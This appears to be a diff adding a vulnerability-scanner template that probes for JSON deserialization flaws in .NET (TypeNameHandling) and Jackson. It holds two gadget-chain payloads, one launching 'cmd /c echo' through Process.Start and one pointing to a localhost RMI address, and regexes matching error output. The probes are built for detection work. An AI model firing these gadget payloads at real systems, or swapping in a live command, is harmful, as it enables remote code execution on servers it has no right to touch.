@@ -1,0 +1,26 @@
+id: json-type-confusion
+info:
+  name: "JSON Type Confusion Deserialization"
+  severity: high
+  description: "Detects JSON deserialization via .NET TypeNameHandling and Jackson polymorphic types"
+  tags: [deserialization, json, dotnet, java, gadget]
+  author: Wired
+
+inject: body
+detection: pattern
+
+payloads:
+  # .NET JSON TypeNameHandling
+  - '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c echo akemi_json_deser"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
+  # Jackson polymorphic type
+  - '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://127.0.0.1:1099/akemi","autoCommit":true}]'
+
+matchers:
+  body_patterns:
+    - "akemi_json_deser"
+    - '(?i)\$type.*System\.'
+    - "(?i)JsonSerializationException"
+    - "(?i)Type specified.*could not be resolved"
+    - "(?i)com\\.fasterxml\\.jackson"
+    - "(?i)Unexpected token"
+    - "(?i)PolymorphicDeserializer"
